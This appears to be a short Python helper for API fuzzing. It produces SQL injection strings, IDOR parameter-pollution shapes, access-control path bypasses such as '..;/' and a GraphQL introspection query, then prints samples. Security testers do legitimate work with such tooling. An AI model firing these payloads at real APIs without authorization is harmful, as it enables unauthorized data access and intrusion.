class APIFuzzerHelper:
    """Helper to generate payloads and commands for API fuzzing."""
    
    @staticmethod
    def get_sqli_payloads(base_id):
        return [
            f"{base_id}' OR 1=1--",
            f"{base_id}\" OR 1=1--",
            f"{base_id} AND 1=1#",
            f"{base_id} AND sleep(10)#"
        ]

    @staticmethod
    def get_idor_bypass_payloads(orig_id):
        return [
            {"id": [orig_id]},
            {"id": {"id": orig_id}},
            f"id={orig_id}&id={orig_id + 1}"
        ]

    @staticmethod
    def get_graphql_introspection_query():
        return '{"query":"{__schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,args{name,type{name,kind}}}}}}"}'

    @staticmethod
    def get_endpoint_bypasses(path):
        return [
            f"{path}.json",
            f"{path}/",
            f"{path}%20",
            f"{path}#",
            f"{path}??",
            f"{path}/..;/ {path.split('/')[-1]}"
        ]

if __name__ == "__main__":
    helper = APIFuzzerHelper()
    
    print("--- SQLi Payloads (ID: 123) ---")
    for p in helper.get_sqli_payloads(123):
        print(f"- {p}")
        
    print("\n--- Endpoint Bypasses (/api/v1/users) ---")
    for b in helper.get_endpoint_bypasses("/api/v1/users"):
        print(f"- {b}")
        
    print("\n--- GraphQL Introspection Query ---")
    print(helper.get_graphql_introspection_query())
